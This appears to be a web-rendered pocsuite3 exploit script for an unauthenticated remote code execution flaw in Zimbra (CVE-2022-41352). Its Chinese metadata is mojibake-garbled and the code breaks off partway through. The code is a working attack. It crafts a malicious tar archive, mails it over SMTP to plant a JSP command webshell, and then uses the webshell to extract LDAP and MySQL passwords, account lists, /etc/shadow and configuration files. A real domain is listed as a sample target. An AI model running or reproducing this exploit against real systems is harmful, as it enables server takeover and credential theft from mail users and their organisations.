class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> (</span><br><span class="line">    minimum_version_required, POCBase, register_poc, requests, logger,</span><br><span class="line">    OptString, OrderedDict,</span><br><span class="line">    random_str, Output,</span><br><span class="line">    get_listener_ip, get_listener_port, REVERSE_PAYLOAD</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.mime.application <span class="keyword">import</span> MIMEApplication</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PoC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;Zimbra Unauthenticated RCE&#x27;</span></span><br><span class="line">    author = <span class="string">&#x27;rainb0w&#x27;</span></span><br><span class="line">    is0day = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&#x27;è¿œç¨‹ä»£ç æ‰§è¡Œ&#x27;</span></span><br><span class="line">    <span class="comment"># ä¸¥é‡ é«˜å± ä¸­å± ä½å±</span></span><br><span class="line">    level = <span class="string">&#x27;éªŒè¯&#x27;</span></span><br><span class="line">    CVE = <span class="string">&#x27;CVE-2022-41352&#x27;</span></span><br><span class="line">    CNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    CNNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ExploitDB = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Vendor = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appName = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appVersion = [<span class="string">&#x27;Zimbra &lt;9.0.0.p27&#x27;</span>, <span class="string">&#x27;Zimbra &lt;8.8.15.p34&#x27;</span>]</span><br><span class="line">    Tags = []</span><br><span class="line">    search_keyword = <span class="string">&#x27;title:&quot;Zimbra ç½‘ç»œå®¢æˆ·ç«¯ç™»å½•&quot;&#x27;</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbraæ˜¯è‘—åçš„å¼€æºç³»ç»Ÿï¼Œæä¾›äº†ä¸€å¥—å¼€æºååŒåŠå…¬å¥—ä»¶åŒ…æ‹¬WebMailï¼Œæ—¥å†ï¼Œé€šä¿¡å½•ï¼ŒWebæ–‡æ¡£ç®¡ç†å’Œåˆ›ä½œã€‚ä¸€ä½“åŒ–åœ°æä¾›äº†é‚®ä»¶æ”¶å‘ã€æ–‡ä»¶å…±äº«ã€ååŒåŠå…¬ã€å³æ—¶èŠå¤©ç­‰ä¸€ç³»åˆ—è§£å†³æ–¹æ¡ˆï¼Œæ˜¯å¼€æºè½¯ä»¶ä¸­çš„ç²¾å“ã€‚</span></span><br><span class="line"><span class="string">    ä½œä¸ºé‚®ä»¶æœåŠ¡å™¨ç³»ç»Ÿï¼ŒZimbraæ›´æ˜¯å‡­å€Ÿå“è¶Šçš„ç¨³å®šæ€§å’ŒåŠŸèƒ½å½“ä¹‹æ— æ„§åœ°æˆä¸ºå¼€æºé‚®ä»¶æœåŠ¡å™¨ç³»ç»Ÿçš„é¦–é€‰ï¼Œé€‚åˆå„ç±»å‹/äººæ•°çš„ç”¨æˆ·ç¾¤ï¼Œå°¤å…¶é€‚åˆå›¢é˜Ÿä½¿ç”¨ã€‚</span></span><br><span class="line"><span class="string">    å…¶æœ€å¤§çš„ç‰¹è‰²åœ¨äºå…¶é‡‡ç”¨AjaxæŠ€æœ¯æ¨¡ä»¿CSæ¡Œé¢åº”ç”¨è½¯ä»¶çš„é£æ ¼å¼€å‘çš„å®¢æˆ·ç«¯å…¼å®¹Firefox,Safariå’ŒIEæµè§ˆå™¨ã€‚</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    details = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    åœ¨Zimbra Collaborationï¼ˆZCSï¼‰8.8.15 å’Œ 9.0ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨cpioæ¼æ´é€šè¿‡amavisdä¸Šä¼ ä»»æ„æ–‡ä»¶åˆ°webç›®å½•/opt/zimbra/jetty/webapps/zimbra/publicï¼Œä»è€Œå¯¼è‡´æœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œã€‚</span></span><br><span class="line"><span class="string">    Zimbraå»ºè®®ç”¨æˆ·ä½¿ç”¨paxä»£æ›¿cpioï¼Œè™½ç„¶å®‰è£…paxæ˜¯Ubuntuä¸Šå®‰è£…Zimbraçš„å‰ææ¡ä»¶ï¼Œä½†æ˜¯åœ¨RHEL 6ï¼ˆæˆ–CentOS 6ï¼‰ä¹‹åï¼ŒRed Hatå‘è¡Œç‰ˆä¸å†é»˜è®¤å®‰è£…paxã€‚</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    è¦ä¿®å¤æ­¤æ¼æ´ï¼Œè¯·åº”ç”¨æœ€æ–°çš„ä¿®è¡¥ç¨‹åºï¼Œæˆ–è€…å®‰è£…paxå¹¶é‡æ–°å¯åŠ¨æœåŠ¡å™¨ã€‚</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    official_solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P27</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    references = []</span><br><span class="line">    samples = [<span class="string">&#x27;https://mail.realclubdelima.org.pe&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_tar_payload</span>(<span class="params">self, payload, payload_name, payload_path, lnk=<span class="string">&#x27;startup&#x27;</span></span>):</span><br><span class="line">        <span class="comment"># Block 1</span></span><br><span class="line">        link = lnk.encode()</span><br><span class="line">        mode = <span class="string">b&#x27;0000777\x00&#x27;</span>  <span class="comment"># link permissions</span></span><br><span class="line">        ouid = <span class="string">b&#x27;0001745\x00&#x27;</span>  <span class="comment"># octal uid (997)</span></span><br><span class="line">        ogid = <span class="string">b&#x27;0001745\x00&#x27;</span>  <span class="comment"># octal gid</span></span><br><span class="line">        lnsz = <span class="string">b&#x27;00000000000\x00&#x27;</span>  <span class="comment"># file size (link = 0)</span></span><br><span class="line">        lmod = <span class="string">b&#x27;14227770134\x00&#x27;</span>  <span class="comment"># last modified (octal unix)</span></span><br><span class="line">        csum = <span class="string">b&#x27;        &#x27;</span>  <span class="comment"># checksum = 8 blanks</span></span><br><span class="line">        <span class="built_in">type</span> = <span class="string">b&#x27;2&#x27;</span>  <span class="comment"># type (link = 2)</span></span><br><span class="line">        targ = payload_path.encode()  <span class="comment"># link target</span></span><br><span class="line">        magi = <span class="string">b&#x27;ustar  \x00&#x27;</span>  <span class="comment"># ustar magic bytes + version</span></span><br><span class="line">        ownu = <span class="string">b&#x27;zimbra&#x27;</span>  <span class="comment"># user owner</span></span><br><span class="line">        owng = <span class="string">b&#x27;zimbra&#x27;</span>  <span class="comment"># group owner</span></span><br><span class="line">        vers = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span>  <span class="comment"># device major and minor</span></span><br><span class="line">        pref = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">155</span>  <span class="comment"># prefix (only used if the file name length exceeds 100)</span></span><br><span class="line"></span><br><span class="line">        raw_b1_1 = link + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(link)) + mode + ouid + ogid + lnsz + lmod</span><br><span class="line">        raw_b1_2 = <span class="built_in">type</span> + targ + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(targ)) + magi + ownu + <span class="string">b&#x27;\x00&#x27;</span> * (</span><br><span class="line">                    <span class="number">32</span> - <span class="built_in">len</span>(ownu)) + owng + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">32</span> - <span class="built_in">len</span>(owng)) + vers + pref</span><br><span class="line">        <span class="comment"># calculate and insert checksum</span></span><br><span class="line">        csum = <span class="built_in">oct</span>(<span class="built_in">sum</span>(b <span class="keyword">for</span> b <span class="keyword">in</span> raw_b1_1 + csum + raw_b1_2))[<span class="number">2</span>:]</span><br><span class="line">        raw_b1 = raw_b1_1 + <span class="string">f&#x27;<span class="subst">&#123;csum:&gt;07&#125;</span>&#x27;</span>.encode() + <span class="string">b&#x27;\x00&#x27;</span> + raw_b1_2</span><br><span class="line">        <span class="comment"># pad block to 512</span></span><br><span class="line">        raw_b1 += <span class="string">b&#x27;\00&#x27;</span> * (<span class="number">512</span> - <span class="built_in">len</span>(raw_b1))</span><br><span class="line">        <span class="comment"># Block 2</span></span><br><span class="line">        mode = <span class="string">b&#x27;0000644\x00&#x27;</span>  <span class="comment"># file permissions</span></span><br><span class="line">        file = <span class="string">f&#x27;<span class="subst">&#123;lnk&#125;</span>/<span class="subst">&#123;payload_name&#125;</span>&#x27;</span>.encode()</span><br><span class="line">        flsz = <span class="built_in">oct</span>(<span class="built_in">len</span>(payload))[<span class="number">2</span>:]  <span class="comment"># file size</span></span><br><span class="line">        csum = <span class="string">b&#x27;        &#x27;</span>  <span class="comment"># checksum = 8 blanks</span></span><br><span class="line">        <span class="built_in">type</span> = <span class="string">b&#x27;0&#x27;</span>  <span class="comment"># type (file = 0)</span></span><br><span class="line">        targ = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">100</span>  <span class="comment"># link target = none</span></span><br><span class="line"></span><br><span class="line">        raw_b2_1 = file + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(file)) + mode + ouid + ogid + <span class="string">f&#x27;<span class="subst">&#123;flsz:&gt;011&#125;</span>&#x27;</span>.encode() + <span class="string">b&#x27;\x00&#x27;</span> + lmod</span><br><span class="line">        raw_b2_2 = <span class="built_in">type</span> + targ + magi + ownu + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">32</span> - <span class="built_in">len</span>(ownu)) + owng + <span class="string">b&#x27;\x00&#x27;</span> * (</span><br><span class="line">                    <span class="number">32</span> - <span class="built_in">len</span>(owng)) + vers + pref</span><br><span class="line">        <span class="comment"># calculate and insert checksum</span></span><br><span class="line">        csum = <span class="built_in">oct</span>(<span class="built_in">sum</span>(b <span class="keyword">for</span> b <span class="keyword">in</span> raw_b2_1 + csum + raw_b2_2))[<span class="number">2</span>:]</span><br><span class="line">        raw_b2 = raw_b2_1 + <span class="string">f&#x27;<span class="subst">&#123;csum:&gt;07&#125;</span>&#x27;</span>.encode() + <span class="string">b&#x27;\x00&#x27;</span> + raw_b2_2</span><br><span class="line">        <span class="comment"># pad block to 512</span></span><br><span class="line">        raw_b2 += <span class="string">b&#x27;\00&#x27;</span> * (<span class="number">512</span> - <span class="built_in">len</span>(raw_b2))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Assemble</span></span><br><span class="line">        raw_tar = raw_b1 + raw_b2 + payload + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">512</span>-(<span class="built_in">len</span>(payload)%<span class="number">512</span>))</span><br><span class="line"></span><br><span class="line">        raw_tar += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">512</span> * <span class="number">2</span>  <span class="comment"># Trailer: end with 2 empty blocks</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> raw_tar</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">smtp_send_file</span>(<span class="params">self, target, sender, recipient, subject, body, attachment, attachment_name</span>):</span><br><span class="line">        msg = MIMEMultipart()</span><br><span class="line">        msg[<span class="string">&#x27;Subject&#x27;</span>] = subject</span><br><span class="line">        msg[<span class="string">&#x27;From&#x27;</span>] = sender</span><br><span class="line">        msg[<span class="string">&#x27;To&#x27;</span>] = recipient</span><br><span class="line"></span><br><span class="line">        message = MIMEText(body, <span class="string">&#x27;html&#x27;</span>)</span><br><span class="line">        msg.attach(message)</span><br><span class="line"></span><br><span class="line">        att = MIMEApplication(attachment)</span><br><span class="line">        att.add_header(<span class="string">&#x27;Content-Disposition&#x27;</span>, <span class="string">&#x27;attachment&#x27;</span>, filename=attachment_name)</span><br><span class="line">        msg.attach(att)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            smtp_server = smtplib.SMTP(target, <span class="number">25</span>)</span><br><span class="line">            smtp_server.sendmail(sender, recipient, msg.as_string())</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_webshell</span>(<span class="params">self</span>):</span><br><span class="line">        webshell_payload = <span class="string">b&quot;&quot;&quot;&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">    Runtime rt = Runtime.getRuntime();</span></span><br><span class="line"><span class="string">    String cmd = request.getParameter(&quot;sMuw1P2&quot;);</span></span><br><span class="line"><span class="string">    Process process = rt.exec(cmd);</span></span><br><span class="line"><span class="string">    java.io.InputStream in = process.getInputStream();</span></span><br><span class="line"><span class="string">    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);</span></span><br><span class="line"><span class="string">    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);</span></span><br><span class="line"><span class="string">    String s = null;</span></span><br><span class="line"><span class="string">    while ((s = stdInput.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">        out.println(s);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&quot;&quot;&quot;</span></span><br><span class="line">        self.webshellPass = <span class="string">&#x27;sMuw1P2&#x27;</span></span><br><span class="line">        target = self.host</span><br><span class="line">        webshell_path = <span class="string">&#x27;/public/jsp&#x27;</span></span><br><span class="line">        self.webshellName = <span class="string">&#x27;Startup1_3.jsp&#x27;</span></span><br><span class="line">        attachment = <span class="string">&#x27;helloWorld.tar&#x27;</span></span><br><span class="line">        b = <span class="built_in">str</span>(self.host).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        domain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(b)):</span><br><span class="line">            <span class="keyword">if</span> i != <span class="built_in">len</span>(b) - <span class="number">1</span>:</span><br><span class="line">                domain = domain + b[i] + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                domain = domain + b[i]</span><br><span class="line">        recipient = <span class="string">&#x27;admin@&#x27;</span> + domain</span><br><span class="line">        email_subject = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">        email_body = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">        upload_base = <span class="string">&#x27;/opt/zimbra/jetty_base/webapps/zimbra&#x27;</span></span><br><span class="line">        tar = self.create_tar_payload(webshell_payload, self.webshellName, upload_base+webshell_path)</span><br><span class="line">        sender = <span class="string">&#x27;anonymous@&#x27;</span> + domain</span><br><span class="line">        self.smtp_send_file(target, sender, recipient, email_subject, email_body, tar, attachment)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">self, command</span>):</span><br><span class="line">        data = &#123;self.webshellPass: command&#125;</span><br><span class="line">        req = requests.post(self.url + <span class="string">&#x27;/public/jsp/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshellName), data=data, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> req.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_Vulnerable</span>(<span class="params">self</span>):</span><br><span class="line">        ranStr2echo = random_str(<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> ranStr2echo <span class="keyword">in</span> self.execute_command(<span class="string">&#x27;echo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ranStr2echo)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_title</span>(<span class="params">self</span>):</span><br><span class="line">        r = requests.get(self.url, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;title&gt;(.+)&lt;/title&gt;&#x27;</span>)</span><br><span class="line">        url_title = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> url_title[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_version</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmcontrol -v&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ldap_and_mysql_Info</span>(<span class="params">self</span>):</span><br><span class="line">        zmlocalconfig = self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmlocalconfig -s&#x27;</span>)</span><br><span class="line">        pattern_email = re.<span class="built_in">compile</span>(<span class="string">&#x27;av_notify_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_password = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ladp_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_url = re.<span class="built_in">compile</span>(<span class="string">&#x27;ldap_url = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_address = re.<span class="built_in">compile</span>(<span class="string">&#x27;mysql_bind_address = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_password = (.*)&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ldap_Pass = re.findall(pattern_ldap_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_user = re.findall(pattern_ladp_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_url = re.findall(pattern_ldap_url, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_address = re.findall(pattern_mysql_address, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_username = re.findall(pattern_mysql_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_Pass = re.findall(pattern_mysql_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            av_notify_user = re.findall(pattern_email, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass, av_notify_user</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetAllAccountsRequest</span>(<span class="params">self</span>):</span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;(\S*)&#x27;</span>)</span><br><span class="line">        users = re.findall(pattern, self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmprov -l gaa&#x27;</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> users:</span><br><span class="line">            users.remove(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> users</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        requests.packages.urllib3.disable_warnings()</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        self.raw_url = self.url</span><br><span class="line">        self.host = urlparse(self.url).hostname</span><br><span class="line">        self.port = urlparse(self.url).port</span><br><span class="line">        <span class="keyword">if</span> self.port <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.port = <span class="number">443</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.upload_webshell()</span><br><span class="line">            <span class="keyword">if</span> self.check_Vulnerable():</span><br><span class="line">                result[<span class="string">&quot;url&quot;</span>] = self.url</span><br><span class="line"></span><br><span class="line">                ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass, av_notify_user = self.get_ldap_and_mysql_Info()</span><br><span class="line">                <span class="comment"># Webç½‘ç«™ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">                result[<span class="string">&quot;web&quot;</span>] = &#123;</span><br><span class="line">                    <span class="comment"># ç½‘ç«™é»˜è®¤é¦–é¡µçš„titleä¿¡æ¯ï¼ˆå¯èƒ½å«æœ‰å•ä½æˆ–ç»„ç»‡ä¿¡æ¯ï¼‰</span></span><br><span class="line">                    <span class="string">&quot;title&quot;</span>: self.get_title(),</span><br><span class="line">                    <span class="string">&quot;version&quot;</span>: self.get_version(),</span><br><span class="line">                    <span class="string">&quot;all accounts&quot;</span>: self.GetAllAccountsRequest(),</span><br><span class="line">                    <span class="comment"># webshellè·¯å¾„åŠå‚æ•°å</span></span><br><span class="line">                    <span class="string">&quot;webshell&quot;</span>: &#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/zimbraAdmin/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshellName),</span><br><span class="line">                                 <span class="string">&quot;password&quot;</span>: self.webshellPass&#125;,</span><br><span class="line">                    <span class="string">&quot;admin notification emails&quot;</span>: av_notify_user</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment"># å‡­æ®ç±»ä¿¡æ¯ï¼Œé’ˆå¯¹å„ç±»å¼±å£ä»¤ã€é»˜è®¤å£ä»¤æ¼æ´</span></span><br><span class="line">                result[<span class="string">&quot;login_credentials&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: ldap_user, <span class="string">&quot;password&quot;</span>: ldap_Pass, <span class="string">&quot;ldap_url&quot;</span>: ldap_url, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;ldap&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: mysql_username, <span class="string">&quot;password&quot;</span>: mysql_Pass, <span class="string">&quot;mysql_bind_address&quot;</span>: mysql_address,</span><br><span class="line">                     <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;mysql&quot;</span>&#125;</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># è·å–çš„æ–‡ä»¶ä¿¡æ¯, é’ˆå¯¹å„ç±»æ–‡ä»¶è¯»å–ç±»æ¼æ´</span></span><br><span class="line">                result[<span class="string">&quot;files&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/passwd&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/hosts&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/hosts&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/shadow&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/shadow&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;resolv,conf&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/resolv.conf&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/resolv.conf&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;localconfig.xml&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/opt/zimbra/conf/localconfig.xml&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /opt/zimbra/conf/localconfig.xml&quot;</span>)&#125;,</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># å‘½ä»¤æ‰§è¡Œä¿¡æ¯, é’ˆå¯¹å„ç±»å‘½ä»¤æ‰§è¡Œã€ä»£ç æ‰§è¡Œæ¼æ´</span></span><br><span class="line">                result[<span class="string">&quot;commands&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;id&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;whoami&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;arp&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;arp -a&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;ifconfig&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;ifconfig&quot;</span>)&#125;</span><br><span class="line">                ]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result.keys()) != <span class="number">0</span>:</span><br><span class="line">            json_result = &#123;</span><br><span class="line">                <span class="string">&quot;result&quot;</span>: &#123;<span class="string">&quot;json&quot;</span>: json.dumps(result)&#125;</span><br><span class="line">            